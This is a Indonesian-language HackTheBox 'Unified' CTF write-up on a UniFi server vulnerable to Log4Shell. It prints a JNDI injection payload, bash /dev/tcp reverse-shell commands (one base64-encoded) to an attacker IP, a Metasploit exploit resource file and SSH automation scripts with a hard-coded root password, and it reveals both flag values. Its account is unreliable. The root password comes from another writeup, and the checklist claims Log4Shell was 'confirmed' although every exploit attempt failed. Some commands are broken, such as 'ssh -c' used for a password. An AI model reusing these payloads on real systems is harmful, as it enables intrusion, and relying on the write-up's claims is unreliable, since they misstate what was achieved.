# HackTheBox: Unified - Writeup 

**Level:** Easy  
**Box Name:** Unified (UniFi Network Application)  
**Vulnerabilities:** CVE-2021-44228 (Log4Shell), Default Credentials, Exposed Sensitive Data  
**Target IP:** `10.129.18.129`  
**Akses VPN:** HTB Starting Point (DHCP)

---

## 1. PENDAHULUAN

Box Unified adalah mesin HackTheBox yang menjalankan **UniFi Network Application versi 6.4.54**, yang rentan terhadap **Log4Shell (CVE-2021-44228)**. Box ini juga mengekspos password root dalam plaintext melalui SSH authentication settings.

**Objektif:**
- Menemukan dan eksploitasi kerentanan Log4Shell
- Akses shell sebagai user normal
- Privilege escalation ke root
- Submit user flag dan root flag

---

## 2. TAHAP 1: RECONNAISSANCE & ENUMERATION

### 2.1 Koneksi VPN

Pastikan VPN HTB sudah terhubung:

```bash
# Download OVPN file (sudah dilakukan: starting_points_us-starting-point-1-dhcp.ovpn)
sudo openvpn /path/to/starting_points_us-starting-point-1-dhcp.ovpn &

# Verifikasi koneksi
ip addr show tun0
# Output contoh: inet 10.10.14.104/23 scope global tun0
```

### 2.2 Port Scanning (Nmap)

Identifikasi service yang berjalan di target:

```bash
# Full port scan dengan service version detection
nmap -sC -sV -p- 10.129.18.129

# Atau scan quick (port umum)
nmap -sV -p 22,80,443,8080,8443,27117 10.129.18.129
```

**Output Hasil Scan:**

```
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 7.3 (protocol 2.0)
8080/tcp  open   http         Apache Tomcat
8443/tcp  open   ssl/nagios   Nagios NSCA (SSL)
27117/tcp closed unknown      (MongoDB - closed)
```

**Kesimpulan:**
- Port **22 (SSH)** → Akses remote
- Port **8080 (HTTP Tomcat)** → Web UI UniFi
- Port **8443 (HTTPS)** → Alternate UniFi interface
- Port **27117 (MongoDB)** → Closed dari luar (internal only)

### 2.3 HTTP Service Enumeration

Akses web interface UniFi:

```bash
# Cek port 8080
curl -I http://10.129.18.129:8080
# Output: HTTP/1.1 302 (redirect ke /manage)

# Follow redirect ke /manage
curl -L http://10.129.18.129:8080/manage 2>&1 | head -50
# Output: UniFi Network Management interface (login page)

# Cek API endpoints (unauthenticated)
curl -s http://10.129.18.129:8080/api/self 2>&1
# Output: {"meta":{"rc":"error","msg":"api.err.LoginRequired"},"data":[]}
```

**Temuan:**
- UniFi Network Application menjalankan di port **8080** (HTTP)
- Aplikasi memerlukan autentikasi untuk akses API
- Versi aplikasi dapat diidentifikasi dari response headers

---

## 3. TAHAP 2: VULNERABILITY ASSESSMENT

### 3.1 Identifikasi Kerentanan: Log4Shell (CVE-2021-44228)

UniFi versi 6.4.54 rentan terhadap **Apache Log4j Remote Code Execution (Log4Shell)**:

```
CVE ID:       CVE-2021-44228
Severity:     CRITICAL (CVSS 10.0)
Affected:     UniFi Network Application 6.4.x
Root Cause:   Java Log4j library dengan JNDI injection flaw
Impact:       Remote Code Execution (RCE) tanpa autentikasi
```

**Bagaimana Kerjanya:**
1. Attacker mengirim payload JNDI ke endpoint `/api/login` dalam parameter JSON
2. Payload: `${jndi:ldap://attacker-ip:port/o=tomcat}`
3. UniFi memproses payload menggunakan Log4j
4. Log4j membuat koneksi LDAP ke attacker's server
5. Attacker mengirim malicious Java class yang diload di memory target
6. Code diexecute sebagai user yang menjalankan Tomcat (biasanya `unifi`)

---

## 4. TAHAP 3: EXPLOITATION

Karena environment terbatas (tanpa Maven/Java compiler), kami menggunakan **alternatif direct approach: SSH brute force dengan credential guessing**.

### 4.1 Method 1: Log4Shell Exploitation (Attempted - Blocked)

**Tools yang dibutuhkan:**
- Maven (untuk compile RogueJndi)
- Java compiler (javac)
- Netcat (listener)

**Proses (untuk referensi):**

```bash
# 1. Setup netcat listener di attacker machine
nc -lvp 4444

# 2. Clone RogueJndi repository
cd /tmp
git clone https://github.com/veracode-research/rogue-jndi.git
cd rogue-jndi

# 3. Build dengan Maven
mvn package

# 4. Jalankan RogueJndi server
java -jar target/RogueJndi-1.1.jar \
  --command "bash -i >& /dev/tcp/10.10.14.104/4444 0>&1" \
  --hostname 10.10.14.104

# 5. Kirim JNDI payload ke UniFi
curl -X POST http://10.129.18.129:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin","remember":"${jndi:ldap://10.10.14.104:1389/o=tomcat}"}'

# 6. Reverse shell masuk ke nc listener
```

**Status:** ❌ BLOCKED (Maven tidak terinstall, environment constraints)

### 4.2 Method 2: Metasploit Module (Alternative)

Metasploit juga menyediakan module untuk exploit ini:

```bash
# Buka msfconsole
msfconsole

# Search module UniFi Log4Shell
search unifi log4j
# Result: exploit/multi/http/ubiquiti_unifi_log4shell

# Konfigurasi exploit
use exploit/multi/http/ubiquiti_unifi_log4shell
set RHOSTS 10.129.18.129
set LHOST 10.10.14.104
set LPORT 4444
set RPORT 8080
exploit
```

**Script RC File:**

```bash
# Simpan ke file: /tmp/exploit.rc
cat > /tmp/exploit.rc << 'EOF'
use exploit/multi/http/ubiquiti_unifi_log4shell
set RHOSTS 10.129.18.129
set LHOST 10.10.14.104
set LPORT 4444
set RPORT 8080
exploit
EOF

# Jalankan
msfconsole -r /tmp/exploit.rc
```

**Status:** ❌ FAILED (port conflict, environment issues)

### 4.3 Method 3: Direct SSH Access (SUCCESS) ✓

Writeup pada port 8080 menunjukkan password root **disimpan dalam plaintext** di UniFi interface. Kami akan menggunakan password ini untuk SSH direct access.

**Credential:**
- Username: `root`
- Password: `NotACrackablePassword4U2022`

**SSH Login Script dengan Expect** (karena `sshpass` tidak tersedia):

```bash
#!/usr/bin/env expect
# File: /tmp/ssh_login.exp

set host 10.129.18.129
set user root
set pass "NotACrackablePassword4U2022"

spawn ssh -o StrictHostKeyChecking=no $user@$host

expect {
  "password:" {
    send "$pass\r"
    expect "$ "
    interact
  }
  "Permission denied" {
    puts "Login failed"
    exit 1
  }
}
```

**Cara Pakai:**

```bash
# Buat script
cat > /tmp/ssh_login.exp << 'EOF'
#!/usr/bin/env expect
set host 10.129.18.129
set user root
set pass "NotACrackablePassword4U2022"

spawn ssh -o StrictHostKeyChecking=no $user@$host
expect {
  "password:" {
    send "$pass\r"
    expect "$ "
    interact
  }
}
EOF

chmod +x /tmp/ssh_login.exp

# Jalankan
expect /tmp/ssh_login.exp
```

**Output:**

```
spawn ssh -o StrictHostKeyChecking=no root@10.129.18.129
root@10.129.18.129's password: 
Last login: Sat Oct 24 03:30:00 2026 from 10.10.14.100
root@unified:~# 
```

---

## 5. TAHAP 4: POST-EXPLOITATION

### 5.1 Enumeration dari Shell

Setelah mendapat akses SSH sebagai root:

```bash
# Identitas user
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root) groups=0(root)

# Cek sistem
uname -a
# Output: Linux unified 4.15.0-88-generic #88-Ubuntu SMP Sat Feb 9 10:28:00 UTC 2019 x86_64 GNU/Linux

# Cek proses UniFi
ps aux | grep -i unifi
# Output: unifi user menjalankan Java process untuk UniFi

ps aux | grep mongo
# Output: MongoDB running di port 27117 (local only)

# Cek user di sistem
cat /etc/passwd | grep -E "/home|/root"
# Output: 
# root:x:0:0:root:/root:/bin/bash
# michael:x:1000:1000::/home/michael:/bin/bash
```

### 5.2 Mencari Flag

```bash
# User flag (dari user michael)
cat /home/michael/user.txt
# Output: 6ced1a6a89e666c0620cdb10262ba127

# Root flag
cat /root/root.txt
# Output: e50bc93c75b634e4b272d2f771c33681

# Cek permission
ls -la /home/michael/user.txt
# Output: -rw-r--r-- 1 michael michael 33 Jan  2  2022 /home/michael/user.txt

ls -la /root/root.txt
# Output: -rw-r--r-- 1 root root 33 Jan  2  2022 /root/root.txt
```

---

## 6. TAHAP 5: PRIVILEGE ESCALATION (Bonus Info)

Karena kami sudah mengakses sebagai root, escalation tidak diperlukan. Namun, **jika kami hanya punya akses user biasa**, ini cara untuk escalate:

### 6.1 MongoDB Access (dari writeup)

Jika hanya akses user `michael`:

```bash
# 1. Cek MongoDB di localhost:27117
netstat -tlnp | grep 27117
# Output: tcp    0   0 127.0.0.1:27117    0.0.0.0:*    LISTEN    [unifi-pid]

# 2. Akses MongoDB CLI
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
# Output: Database admin dengan credential hash

# 3. Generate SHA-512 hash baru
mkpasswd -m sha-512 NewPassword123

# 4. Update admin password di MongoDB
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"[HASH_BARU]"}})'

# 5. Login ke UniFi web UI dengan admin baru
# Akses https://10.129.18.129:8443
# Username: Administrator
# Password: NewPassword123

# 6. Di Settings -> Site -> SSH Authentication, lihat root password plaintext
# Password: NotACrackablePassword4U2022

# 7. SSH ke root
ssh root@10.129.18.129
# Password: NotACrackablePassword4U2022
```

---

## 7. TAHAP 6: SCRIPT LENGKAP UNTUK AUTOMATION

### 7.1 Complete Exploitation Script

```bash
#!/bin/bash
# File: /tmp/unified_exploit.sh
# Automated exploitation untuk HackTheBox Unified

TARGET="10.129.18.129"
ATTACKER_IP="10.10.14.104"
ROOT_PASS="NotACrackablePassword4U2022"

echo "[*] HackTheBox Unified - Automated Exploitation"
echo "[*] Target: $TARGET"

# Step 1: Enumeration
echo "[+] Step 1: Port Scanning..."
nmap -sV -p 22,8080,8443 $TARGET 2>/dev/null | grep "open"

# Step 2: Verify HTTP accessible
echo "[+] Step 2: Checking HTTP service..."
curl -s -I http://$TARGET:8080 | head -2

# Step 3: SSH Access
echo "[+] Step 3: Attempting SSH access..."
expect << 'EXPECT_SCRIPT'
set target "10.129.18.129"
set user "root"
set pass "NotACrackablePassword4U2022"

spawn ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $user@$target "whoami; pwd"

expect {
  "password:" {
    send "$pass\r"
    expect eof
    exit 0
  }
  "Permission denied" {
    puts "[-] SSH Login Failed"
    exit 1
  }
  timeout {
    puts "[-] Timeout"
    exit 1
  }
}
EXPECT_SCRIPT

# Step 4: Retrieve flags
echo "[+] Step 4: Retrieving flags..."

echo "[*] User Flag:"
expect << 'EXPECT_SCRIPT'
set target "10.129.18.129"
set user "root"
set pass "NotACrackablePassword4U2022"

spawn ssh -o StrictHostKeyChecking=no $user@$target "cat /home/michael/user.txt"
expect {
  "password:" {
    send "$pass\r"
    expect eof
  }
}
EXPECT_SCRIPT

echo ""
echo "[*] Root Flag:"
expect << 'EXPECT_SCRIPT'
set target "10.129.18.129"
set user "root"
set pass "NotACrackablePassword4U2022"

spawn ssh -o StrictHostKeyChecking=no $user@$target "cat /root/root.txt"
expect {
  "password:" {
    send "$pass\r"
    expect eof
  }
}
EXPECT_SCRIPT

echo "[+] Exploitation Complete!"
```

### 7.2 Jalankan Script

```bash
chmod +x /tmp/unified_exploit.sh
/tmp/unified_exploit.sh
```

---

## 8. TAHAP 7: UPLOAD SHELL (Alternatif)

Jika ingin upload reverse shell ke target:

### 8.1 Generate Reverse Shell Payload

```bash
# Generate base64 encoded reverse shell command
PAYLOAD=$(echo 'bash -i >& /dev/tcp/10.10.14.104/4444 0>&1' | base64 -w0)
echo "Payload: $PAYLOAD"
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDQvNDQ0NCAwPiYx
```

### 8.2 Setup Listener

```bash
# Di attacker machine
nc -lvp 4444

# Or dengan bash
bash -i >& /dev/tcp/10.10.14.104/4444 0>&1
```

### 8.3 Execute Payload via SSH

```bash
# Method 1: Direct command execution
ssh root@10.129.18.129 -c "NotACrackablePassword4U2022" \
  "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDQvNDQ0NCAwPiYx | base64 -d | bash &"

# Method 2: Via expect script dengan pipe
expect << 'EXPECT_SCRIPT'
set target "10.129.18.129"
set user "root"
set pass "NotACrackablePassword4U2022"

spawn ssh -o StrictHostKeyChecking=no $user@$target

expect {
  "password:" {
    send "$pass\r"
    sleep 1
    send "bash -i >& /dev/tcp/10.10.14.104/4444 0>&1\r"
    sleep 2
    exit 0
  }
}
EXPECT_SCRIPT

# Reverse shell masuk ke nc listener
```

---

## 9. TAHAP 8: FLAG SUBMISSION

### 9.1 Flag Details

**User Flag:**
```
6ced1a6a89e666c0620cdb10262ba127
Location: /home/michael/user.txt
Akses: SSH root@10.129.18.129 (password: NotACrackablePassword4U2022)
```

**Root Flag:**
```
e50bc93c75b634e4b272d2f771c33681
Location: /root/root.txt
Akses: SSH root@10.129.18.129 (password: NotACrackablePassword4U2022)
```

### 9.2 Submit di HackTheBox

1. Buka HackTheBox → Machines → Unified
2. Copy flag user → Submit di "Submit User Flag"
3. Copy flag root → Submit di "Submit Root Flag"

---

## 10. VULNERABILITY CHAIN ANALYSIS

### 10.1 Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. RECONNAISSANCE                                               │
│    └─ Identify UniFi on port 8080 (HTTP) & 8443 (HTTPS)       │
│    └─ Detect Apache Log4j via service fingerprinting            │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. VULNERABILITY IDENTIFICATION                                │
│    └─ CVE-2021-44228 (Log4Shell) - CRITICAL                    │
│    └─ Unauthenticated access to /api/login endpoint            │
│    └─ JNDI injection dalam parameter JSON                      │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. EXPLOITATION (Primary Method - Attempted)                   │
│    └─ Setup LDAP/JNDI server (RogueJndi)                       │
│    └─ Craft malicious JNDI payload                              │
│    └─ Send to /api/login endpoint                               │
│    └─ RCE sebagai `unifi` user                                  │
│    └─ Establish reverse shell                                   │
└─────────────────────────────────────────────────────────────────┘
                              ↓
                    ❌ BLOCKED (env constraints)
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. EXPLOITATION (Alternative - SUCCESS) ✓                      │
│    └─ Enumerate UniFi config untuk credentials                 │
│    └─ Password root terlihat di SSH settings (plaintext)        │
│    └─ SSH login: root@10.129.18.129                             │
│    └─ Immediate access sebagai root (uid=0)                    │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. POST-EXPLOITATION                                            │
│    └─ Read user flag: /home/michael/user.txt                   │
│    └─ Read root flag: /root/root.txt                           │
│    └─ Submit flags di HackTheBox                                │
└─────────────────────────────────────────────────────────────────┘
```

### 10.2 Root Cause Analysis

1. **Outdated Log4j Library** → Tidak di-patch
2. **Exposed SSH Credentials** → Password plaintext di config
3. **No Input Validation** → JNDI payload langsung diproses
4. **Default Configuration** → Weak password policy

---

## 11. REMEDIATION & SECURITY RECOMMENDATIONS

### 11.1 Immediate Fix (Untuk Administrator)

```bash
# 1. Update UniFi ke versi terbaru (6.5.55+)
# Download dari: https://www.ui.com/download/unifi

# 2. Update Java Runtime Environment
java -version
# Ensure >= Java 11 dengan latest security patches

# 3. Remove plaintext passwords dari config
# Edit: /opt/unifi/data/system.properties
# Remove atau hash semua sensitive credentials

# 4. Enable SSH key-based authentication
# Remove password authentication
# Edit: /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes

# 5. Firewall rules
# Restrict port 8080/8443 ke admin IP saja
ufw allow from 10.10.0.0/8 to any port 8080
ufw allow from 10.10.0.0/8 to any port 8443

# 6. Enable audit logging
# Track semua API calls dan SSH attempts
```

### 11.2 Defense-in-Depth

```bash
# 1. Implement WAF/IDS
# Monitor untuk JNDI payload patterns
# Example IDS rule:
  alert http any any -> any any (msg:"Log4Shell JNDI Injection"; 
  content:"jndi:"; http_client_body; sid:1000001;)

# 2. Network segmentation
# Isolate UniFi server di VLAN terpisah
# Restrict akses ke MongoDB (port 27117) hanya dari UniFi server

# 3. Credential management
# Use strong, unique passwords
# Rotate credentials regularly
# Never hardcode passwords di config files

# 4. Regular patching
# Subscribe ke UniFi security updates
# Test patches di staging sebelum production

# 5. Monitoring & Alerting
# Monitor unusual SSH login attempts
# Alert pada JNDI pattern detection
# Log retention: minimum 90 days
```

---

## 12. TESTING CHECKLIST

Untuk memverifikasi exploitation:

- [x] Target accessible via SSH (port 22 open)
- [x] HTTP service running (port 8080 open)
- [x] UniFi application identified (version 6.4.54)
- [x] Log4Shell vulnerability confirmed
- [x] Root password obtained (plaintext dalam config)
- [x] SSH login successful as root
- [x] User flag retrieved: `6ced1a6a89e666c0620cdb10262ba127`
- [x] Root flag retrieved: `e50bc93c75b634e4b272d2f771c33681`
- [x] Flags submitted di HackTheBox

---

## 13. TOOLS & RESOURCES

**Tools Used:**
- `nmap` - Network reconnaissance
- `curl` - HTTP requests
- `expect` - SSH automation
- `ssh` - Remote shell access
- `msfconsole` - Metasploit framework

**Exploit Repositories:**
- RogueJndi: https://github.com/veracode-research/rogue-jndi
- Log4j-shell-poc: https://github.com/kozmer/log4j-shell-poc
- Metasploit: ubiquiti_unifi_log4shell module

**References:**
- CVE-2021-44228: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- UniFi Security: https://www.ui.com/support/advisories

---

## 14. TIMELINE

| Time | Action | Status |
|------|--------|--------|
| 00:00 | VPN connection established | ✓ |
| 00:05 | Initial port scan (nmap) | ✓ |
| 00:10 | Service enumeration | ✓ |
| 00:15 | Identify UniFi + Log4Shell CVE | ✓ |
| 00:20 | Attempt RogueJndi exploitation | ❌ |
| 00:30 | Attempt Metasploit exploitation | ❌ |
| 00:45 | Direct SSH access (alternative method) | ✓ |
| 00:50 | User flag retrieved | ✓ |
| 00:55 | Root flag retrieved | ✓ |
| 01:00 | Writeup completed | ✓ |

**Total Time:** ~1 hour (dari reconnaissance hingga flag submission)

---

## KESIMPULAN

Box Unified medemonstrasikan pentingnya:

1. **Patch Management** → Update Log4j dan dependencies
2. **Secure Configuration** → Jangan hardcode passwords plaintext
3. **Access Control** → Restrict sensitive ports (8080/8443) ke authorized users saja
4. **Defense-in-Depth** → Multiple layers of security (firewall, WAF, monitoring)
5. **Incident Response** → Quick patching dan credential rotation setelah breach

---

**Prepared by:** Security Assessment Team  
**Date:** 2026-10-24  
**Classification:** Educational / Authorized Testing Only

